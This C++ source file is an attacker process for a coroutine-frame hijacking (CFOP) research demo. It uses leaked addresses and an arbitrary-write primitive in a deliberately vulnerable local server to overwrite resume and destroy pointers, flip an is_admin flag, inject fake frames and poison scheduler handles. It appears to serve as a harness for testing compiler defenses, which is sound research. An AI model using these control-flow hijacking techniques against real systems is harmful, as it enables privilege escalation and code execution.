/**
 * attacker.cpp  —  CFOP Demo: Attacker Process
 * ==============================================
 * Connects to victim_server and performs CFOP attacks using only two
 * primitives the victim's vulnerability exposes over TCP:
 *
 *   INFO  — leak addresses of live coroutine frames and code pointers
 *           (models a heap info-leak / ASLR-bypass primitive)
 *
 *   WRITE — write arbitrary bytes to any victim address
 *           (models a heap overflow, UAF write, or format-string write)
 *
 * The attacker never touches victim memory directly; everything goes
 * through the socket protocol.  This makes the cross-process nature of
 * the attack explicit and auditable.
 *
 * Build:
 *   clang++/g++ -std=c++20 -O1 -g -o attacker attacker.cpp
 *
 * Usage:
 *   ./attacker [1|2|3|4|5|all]   (default: all)
 */

#include <arpa/inet.h>
#include <cerrno>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <functional>
#include <netinet/in.h>
#include <string>
#include <sys/socket.h>
#include <unistd.h>

static constexpr uint16_t VICTIM_PORT = 4444;
static constexpr const char *VICTIM_HOST = "127.0.0.1";

// ─────────────────────────────────────────────────────────────────────────────
// §1  TCP connection to victim
// ─────────────────────────────────────────────────────────────────────────────

struct Conn {
    int fd = -1;
    FILE *rx = nullptr; // buffered reads
    FILE *tx = nullptr; // buffered writes (same fd)

    static Conn open() {
        Conn c;
        c.fd = socket(AF_INET, SOCK_STREAM, 0);
        if (c.fd < 0) {
            perror("[ATTACKER] socket");
            exit(1);
        }

        struct sockaddr_in sa {};
        sa.sin_family = AF_INET;
        sa.sin_port = htons(VICTIM_PORT);
        inet_pton(AF_INET, VICTIM_HOST, &sa.sin_addr);

        if (connect(c.fd, (struct sockaddr *)&sa, sizeof sa) < 0) {
            perror("[ATTACKER] connect");
            exit(1);
        }
        c.rx = fdopen(dup(c.fd), "r");
        c.tx = fdopen(c.fd, "w");

        // Consume the READY banner.
        char buf[256] = {};
        if (fgets(buf, sizeof buf, c.rx))
            fprintf(stdout, "[ATTACKER] Connected  victim says: %s", buf);
        return c;
    }

    void close_conn() {
        send("QUIT\n");
        char buf[64] = {};
        (void)fgets(buf, sizeof buf, rx); // consume "OK bye"
        fclose(rx);
        fclose(tx);
        fd = -1;
    }

    void send(const char *line) {
        fputs(line, tx);
        fflush(tx);
    }

    // Read one complete line from the victim (blocks until \n).
    std::string recv_line() {
        char buf[4096] = {};
        if (!fgets(buf, sizeof buf, rx))
            return "";
        buf[strcspn(buf, "\r\n")] = '\0';
        return buf;
    }

    // Read lines until "END" (for multi-line responses like INFO).
    // Calls cb(key, value_str) for each "key  value" line.
    void recv_kv_block(std::function<void(const char *, const char *)> cb) {
        std::string line;
        while ((line = recv_line()) != "END" && !line.empty()) {
            char key[64] = {}, val[128] = {};
            if (sscanf(line.c_str(), " %63s %127s", key, val) == 2)
                cb(key, val);
        }
    }
};

// ─────────────────────────────────────────────────────────────────────────────
// §2  Leaked address block
// ─────────────────────────────────────────────────────────────────────────────

struct VictimInfo {
    uintptr_t worker_frame = 0;  // base of the live worker coroutine frame
    uintptr_t resume_fn = 0;     // legitimate resume stub (in victim .text)
    uintptr_t destroy_fn = 0;    // legitimate destroy stub
    uintptr_t hijack_target = 0; // attacker's redirect goal (in victim .text)
    uintptr_t is_admin_ptr = 0;  // &is_admin inside the privileged coroutine
    uintptr_t scratch_buf = 0;   // writable buffer for staging a fake frame
    uintptr_t handle_store = 0;  // address of g_redirectable_handle (a void*)
};

// ─────────────────────────────────────────────────────────────────────────────
// §3  INFO — perform the address leak
// ─────────────────────────────────────────────────────────────────────────────

static uintptr_t parse_hex(const char *s) {
    unsigned long long v = 0;
    sscanf(s, "%llx", &v);
    return (uintptr_t)v;
}

static VictimInfo leak_info(Conn &c) {
    c.send("INFO\n");
    std::string hdr = c.recv_line();
    if (hdr != "OK") {
        fprintf(stderr, "[ATTACKER] INFO failed: %s\n", hdr.c_str());
        exit(1);
    }

    VictimInfo a;
    c.recv_kv_block([&](const char *k, const char *v) {
        uintptr_t p = parse_hex(v);
        if (!strcmp(k, "worker_frame"))
            a.worker_frame = p;
        if (!strcmp(k, "resume_fn"))
            a.resume_fn = p;
        if (!strcmp(k, "destroy_fn"))
            a.destroy_fn = p;
        if (!strcmp(k, "hijack_target"))
            a.hijack_target = p;
        if (!strcmp(k, "is_admin_ptr"))
            a.is_admin_ptr = p;
        if (!strcmp(k, "scratch_buf"))
            a.scratch_buf = p;
        if (!strcmp(k, "handle_store"))
            a.handle_store = p;
    });

    fprintf(
        stdout,
        "[ATTACKER] Leaked from victim:\n"
        "  worker_frame   0x%016llx   ← heap coroutine frame\n"
        "  resume_fn      0x%016llx   ← legitimate stub (victim .text)\n"
        "  destroy_fn     0x%016llx   ← legitimate stub (victim .text)\n"
        "  hijack_target  0x%016llx   ← our target      (victim .text)\n"
        "  is_admin_ptr   0x%016llx   ← &is_admin in heap frame\n"
        "  scratch_buf    0x%016llx   ← writable buffer  (victim BSS)\n"
        "  handle_store   0x%016llx   ← &g_redirectable_handle (victim BSS)\n",
        (unsigned long long)a.worker_frame,
        (unsigned long long)a.resume_fn,
        (unsigned long long)a.destroy_fn,
        (unsigned long long)a.hijack_target,
        (unsigned long long)a.is_admin_ptr,
        (unsigned long long)a.scratch_buf,
        (unsigned long long)a.handle_store);

    return a;
}

// ─────────────────────────────────────────────────────────────────────────────
// §4  WRITE — exercise the arbitrary-write vulnerability
// ─────────────────────────────────────────────────────────────────────────────

// Encode `n` bytes as a contiguous hex string (no spaces).
static std::string to_hex(const uint8_t *data, size_t n) {
    std::string s;
    s.reserve(n * 2);
    char tmp[3];
    for (size_t i = 0; i < n; i++) {
        snprintf(tmp, sizeof tmp, "%02x", data[i]);
        s += tmp;
    }
    return s;
}

// Serialise a pointer as 8 bytes, little-endian (x86-64 native order).
static std::string ptr_le(uintptr_t p) {
    uint8_t b[8];
    for (int i = 0; i < 8; i++, p >>= 8)
        b[i] = p & 0xff;
    return to_hex(b, 8);
}

static void victim_write(Conn &c, uintptr_t addr, const uint8_t *data, int n) {
    char cmd[4096];
    snprintf(cmd,
             sizeof cmd,
             "WRITE %llx %d %s\n",
             (unsigned long long)addr,
             n,
             to_hex(data, n).c_str());
    c.send(cmd);
    std::string r = c.recv_line();
    fprintf(stdout, "[ATTACKER]   WRITE → %s\n", r.c_str());
}

static void write_ptr(Conn &c, uintptr_t dest, uintptr_t val) {
    uint8_t b[8];
    uintptr_t v = val;
    for (int i = 0; i < 8; i++, v >>= 8)
        b[i] = v & 0xff;
    victim_write(c, dest, b, 8);
}

static void write_byte(Conn &c, uintptr_t dest, uint8_t val) {
    victim_write(c, dest, &val, 1);
}

// ─────────────────────────────────────────────────────────────────────────────
// §5  TRIGGER helpers
// ─────────────────────────────────────────────────────────────────────────────

static void trigger(Conn &c, const char *what) {
    char cmd[64];
    snprintf(cmd, sizeof cmd, "TRIGGER %s\n", what);
    c.send(cmd);
    std::string r = c.recv_line();
    fprintf(stdout, "[ATTACKER]   TRIGGER %-12s → %s\n", what, r.c_str());
}

static void reset(Conn &c) {
    c.send("RESET\n");
    std::string r = c.recv_line();
    fprintf(stdout, "[ATTACKER] RESET → %s\n\n", r.c_str());
}

// ─────────────────────────────────────────────────────────────────────────────
// §6  Attacks
// ─────────────────────────────────────────────────────────────────────────────

static void banner(int n, const char *title, const char *paper_ref) {
    fprintf(
        stdout,
        "\n"
        "══════════════════════════════════════════════════════════════════\n"
        " Attack %d — %s\n"
        " Paper:   %s\n"
        "══════════════════════════════════════════════════════════════════\n",
        n,
        title,
        paper_ref);
}

// ── Attack 1: Resume Pointer Overwrite
// ───────────────────────────────────────
//
// The coroutine frame stores the resume function pointer at offset 0.
// Overwriting it with hijack_target causes the victim's next handle.resume()
// call to execute our function instead.
// ─────────────────────────────────────────────────────────────────────────────
static void attack_1(Conn &c) {
    banner(1, "Resume Pointer Overwrite", "CFOP §3.5.1");
    auto info = leak_info(c);

    fprintf(stdout,
            "\n[ATTACKER] frame[0] (resume_fn) is at victim address 0x%llx\n"
            "[ATTACKER] Overwriting it with hijack_target (0x%llx)...\n",
            (unsigned long long)info.worker_frame,
            (unsigned long long)info.hijack_target);

    write_ptr(c, info.worker_frame + 0, info.hijack_target);

    fprintf(stdout,
            "[ATTACKER] Sending TRIGGER RESUME — victim will call "
            "hijack_target instead of the coroutine body:\n");
    trigger(c, "RESUME");
}

// ── Attack 2: Destroy Pointer Overwrite
// ──────────────────────────────────────
//
// frame[8] is the destroy pointer.  It fires when the victim calls
// handle.destroy() — including implicitly when a Task goes out of scope.
// ─────────────────────────────────────────────────────────────────────────────
static void attack_2(Conn &c) {
    banner(2, "Destroy Pointer Overwrite", "CFOP §3.5.1");
    auto info = leak_info(c);

    fprintf(stdout,
            "\n[ATTACKER] frame[8] (destroy_fn) is at victim address 0x%llx\n"
            "[ATTACKER] Overwriting it with hijack_target (0x%llx)...\n",
            (unsigned long long)(info.worker_frame + 8),
            (unsigned long long)info.hijack_target);

    write_ptr(c, info.worker_frame + 8, info.hijack_target);

    fprintf(stdout,
            "[ATTACKER] Sending TRIGGER DESTROY — victim calls hijack_target "
            "during cleanup:\n");
    trigger(c, "DESTROY");
}

// ── Attack 3: Data-Only Attack (DOA)
// ─────────────────────────────────────────
//
// No function pointer is touched.  The attacker flips is_admin (a volatile
// bool in the heap frame) from false to true.  CFI is completely blind to
// this because it only instruments indirect call sites.
//
// The is_admin address is leaked via INFO (models DWARF debug info leak,
// type confusion, or a second heap read-anywhere primitive).
// ─────────────────────────────────────────────────────────────────────────────
static void attack_3(Conn &c) {
    banner(3, "Data-Only Attack — is_admin flip", "CFOP §5.3");
    auto info = leak_info(c);

    if (!info.is_admin_ptr) {
        fprintf(stdout,
                "[ATTACKER] is_admin_ptr not available (coro not ready)\n");
        return;
    }

    fprintf(
        stdout,
        "\n[ATTACKER] is_admin lives at 0x%llx inside the heap frame\n"
        "[ATTACKER] No function pointer is touched — CFI cannot block this.\n"
        "[ATTACKER] Writing 0x01 to is_admin...\n",
        (unsigned long long)info.is_admin_ptr);

    write_byte(c, info.is_admin_ptr, 0x01);

    fprintf(
        stdout,
        "[ATTACKER] Sending TRIGGER PRIVILEGED — victim checks is_admin:\n");
    trigger(c, "PRIVILEGED");
}

// ── Attack 4: Fake Frame Injection
// ───────────────────────────────────────────
//
// The attacker builds a fake coroutine frame (resume_fn = hijack_target)
// in victim memory using the WRITE primitive, then redirects an existing
// coroutine_handle to point at the fake frame.
//
// A coroutine_handle<> is internally a single void*.  Writing a new pointer
// over handle_store makes g_redirectable_handle.resume() dispatch through
// the fake frame → hijack_target.
// ─────────────────────────────────────────────────────────────────────────────
static void attack_4(Conn &c) {
    banner(4, "Fake Frame Injection", "CFOP §3.5.2");
    auto info = leak_info(c);

    fprintf(stdout,
            "\n[ATTACKER] Step 1: write fake frame into victim scratch_buf "
            "(0x%llx)\n",
            (unsigned long long)info.scratch_buf);
    fprintf(stdout,
            "           fake[0..7]  = hijack_target (0x%llx) — resume_fn\n"
            "           fake[8..15] = hijack_target            — destroy_fn\n",
            (unsigned long long)info.hijack_target);

    write_ptr(c, info.scratch_buf + 0, info.hijack_target);
    write_ptr(c, info.scratch_buf + 8, info.hijack_target);

    fprintf(
        stdout,
        "\n[ATTACKER] Step 2: redirect handle_store (0x%llx) → scratch_buf\n"
        "           g_redirectable_handle will now point at our fake frame\n",
        (unsigned long long)info.handle_store);

    write_ptr(c, info.handle_store, info.scratch_buf);

    fprintf(stdout,
            "\n[ATTACKER] Step 3: TRIGGER FAKE — victim calls "
            "g_redirectable_handle.resume()\n"
            "           which reads resume_fn from the fake frame:\n");
    trigger(c, "FAKE");
}

// ── Attack 5: Scheduler-Queue CFP
// ────────────────────────────────────────────
//
// Demonstrates that any stored coroutine_handle is a Controlled Frame
// Pointer (CFP).  Here the scheduler's handle (g_redirectable_handle, which
// is already pointing at the worker frame) fires after we poison the worker
// frame's resume_fn.  This models an I/O-completion or timer event in
// ScyllaDB/Seastar waking a poisoned coroutine.
// ─────────────────────────────────────────────────────────────────────────────
static void attack_5(Conn &c) {
    banner(5, "Scheduler-Queue CFP", "CFOP §3.5.3");
    auto info = leak_info(c);

    fprintf(
        stdout,
        "\n[ATTACKER] g_redirectable_handle already points at worker_frame "
        "(0x%llx)\n"
        "           (models a handle sitting in a coroutine scheduler "
        "queue)\n",
        (unsigned long long)info.worker_frame);

    fprintf(
        stdout,
        "\n[ATTACKER] Poisoning worker_frame[0] (resume_fn) → hijack_target "
        "(0x%llx)...\n",
        (unsigned long long)info.hijack_target);

    write_ptr(c, info.worker_frame + 0, info.hijack_target);

    fprintf(stdout,
            "\n[ATTACKER] Sending TRIGGER FAKE — scheduler fires the poisoned "
            "handle:\n");
    trigger(c, "FAKE");
}

// ─────────────────────────────────────────────────────────────────────────────
// §7  main
// ─────────────────────────────────────────────────────────────────────────────

int main(int argc, char *argv[]) {
    const char *which = (argc > 1) ? argv[1] : "all";

    fprintf(
        stdout,
        "╔══════════════════════════════════════════════════════════════╗\n"
        "║  CFOP Demo — Attacker Process                               ║\n"
        "║  Target: %s:%-5u                                      ║\n"
        "╚══════════════════════════════════════════════════════════════╝\n\n",
        VICTIM_HOST,
        VICTIM_PORT);

    struct Entry {
        const char *id;
        const char *name;
        void (*fn)(Conn &);
    } attacks[] = {
        {"1", "Resume Pointer Overwrite", attack_1},
        {"2", "Destroy Pointer Overwrite", attack_2},
        {"3", "Data-Only Attack (DOA)", attack_3},
        {"4", "Fake Frame Injection", attack_4},
        {"5", "Scheduler-Queue CFP", attack_5},
    };

    for (auto &atk : attacks) {
        bool run = (strcmp(which, "all") == 0 || strcmp(which, atk.id) == 0);
        if (!run)
            continue;

        // Each attack opens a fresh connection so victim state is clean.
        Conn c = Conn::open();
        atk.fn(c);

        fprintf(stdout, "\n[ATTACKER] Waiting 0.5 s for victim output...\n");
        usleep(500000);

        reset(c);
        c.close_conn();
    }

    fprintf(
        stdout,
        "══════════════════════════════════════════════════════════════════\n"
        " All selected attacks completed.\n"
        " To test defenses: recompile victim_server with your LLVM pass\n"
        " and re-run — attacks should abort() inside the victim.\n"
        "══════════════════════════════════════════════════════════════════"
        "\n");
    return 0;
}
